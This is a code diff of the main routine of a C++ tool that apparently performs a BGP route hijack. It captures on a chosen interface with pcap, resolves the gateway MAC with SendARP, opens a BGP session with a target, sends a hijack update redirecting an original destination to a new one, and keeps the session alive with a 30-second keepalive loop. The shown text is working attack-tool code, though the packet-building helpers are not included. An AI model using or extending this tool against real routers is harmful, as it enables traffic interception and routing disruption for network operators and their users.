@@ -20,7 +20,7 @@ int main(int argc, char* argv[]) {
 
 	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].c_str(), 65536, 0, 1, errbuf);
 	if (handle == NULL) {
-		cout << "Failed to open pcap handle." << endl;
+		cout << endl << "Failed to open pcap handle." << endl;
 		return 0;
 	}
 
@@ -34,16 +34,31 @@ int main(int argc, char* argv[]) {
 	ULONG gateway[6];
 	ULONG maclen = 6;
 	if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &gateway, &maclen) != NO_ERROR) {
-		cout << "Failed to find MAC address for default gateway." << endl;
+		cout << endl << "Failed to find MAC address for default gateway." << endl;
 		return 0;
 	}
 
-	if (hijack(handle, target, odest, ndest, (uint8_t*)(BYTE*)gateway)) {
-		cout << endl << "Redirected successfully" << endl;
-		return 1;
-	}
-	else {
+	uint32_t seq = 0;
+	if (!open_conn(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
 		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
 		return 0;
+	}
+	seq += 29;
+
+	if (!hijack(handle, target, odest, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
+		cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
+		return 0;
+	}
+	seq += 42;
+
+	cout << endl << "Press CTRL+C to stop" << endl;
+
+	while (1) {
+		if (!keepalive(handle, target, ndest, (uint8_t*)(BYTE*)gateway, seq)) {
+			cout << endl << "Failed to send BGP packet. Are you sure that you've specified the correct interface?" << endl;
+			return 0;
+		}
+		seq += 19;
+		Sleep(30000);
 	}
 }
